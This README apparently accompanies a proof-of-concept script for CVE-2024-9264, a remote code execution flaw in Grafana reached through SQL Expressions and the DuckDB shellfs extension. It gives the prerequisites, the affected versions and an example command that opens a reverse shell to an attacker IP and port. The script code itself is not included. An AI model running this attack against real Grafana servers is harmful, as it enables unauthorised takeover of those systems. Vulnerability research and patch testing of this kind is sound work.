# CVE-2024-9264-RCE-Exploit in Grafana via SQL Expressions

## Description
Proof Of Concept for Remote Code Execution in Grafana (CVE-2024-9264)

This repository contains a Python script that exploits a Remote Code Execution (RCE) vulnerability in Grafana's SQL Expressions feature. 
By leveraging insufficient input sanitization, this exploit allows an attacker to execute arbitrary shell commands on the server.
This is made possible through the shellfs community extension, which can be installed and loaded by an attacker to facilitate command execution.

## Prerequisites
- authenticated Grafana user with `Viewer` permissions or higher
- DuckDB binary must be installed and accessible through Grafana's PATH

## Impacted version
Grafana >= v11.0.0 (all v11.x.y are impacted)

## Usage
```
python3 Graphana_RCE.py [--url <target>] [--username <username>] [--password <password>] [--reverse-ip <IP>] [--reverse-port <PORT>]
```

## Example
```
python Graphana_RCE.py --url http://127.0.0.1:3000 --username eviluser --password eviluser --reverse-ip 10.10.1.41 --reverse-port 9001
```

## Disclaimer

This script is intended for educational purposes and for use in controlled environments where you have permission to test the security of the system. Misuse of this tool could lead to legal consequences.
